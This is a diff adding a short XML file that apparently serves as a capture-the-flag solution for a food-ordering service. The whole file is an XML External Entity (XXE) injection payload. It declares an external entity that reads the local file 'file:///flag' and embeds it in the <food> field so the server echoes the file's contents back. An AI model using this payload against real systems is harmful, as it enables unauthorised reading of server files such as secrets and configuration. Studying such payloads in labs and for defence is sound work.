@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE user [<!ENTITY internal SYSTEM "file:///flag">]>  
+<root>
+	<table_num>1</table_num>
+	<food>Ice Scream:&internal;</food>
+</root>
